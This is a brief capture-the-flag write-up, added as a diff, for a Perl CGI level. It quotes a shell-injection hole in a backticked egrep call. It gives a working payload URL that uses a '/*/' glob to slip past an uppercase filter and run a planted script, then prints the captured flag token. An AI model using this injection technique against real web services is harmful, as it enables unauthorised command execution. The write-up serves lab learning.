@@ -1,0 +1,26 @@
+Here, we have a perl file called level12.pl
+
+If we cat it, we can see that several interesting lines:
+# localhost:4646
+$xx = $_[0];
+$xx =~ tr/a-z/A-Z/; 
+$xx =~ s/\s.*//;
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+n(t(param("x"), param("y")));
+
+We can see a security hole in the line with egrep.
+The problem here is the 3rd and the 4th lines:
+-the 3rd will change every lower char to upper char
+-the 4th will delete all spaces
+
+To go through this, we will put our script in a file like this: /tmp/HACKED
+and we'll put:
+getflag > /tmp/whatever
+don't forget to chmod 777 /tmp/HACKED so the perl file can execute it
+
+after that we will go through the security hole by sending the file as the first param of the web page:
+http://192.168.1.65:4646/level12.pl?x="`/*/HACKED`"
+note: we use /*/ insteed of /tmp/ so it is not converted to /TMP/
+
+Now we can cat /tmp/whatever to get our flag:
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
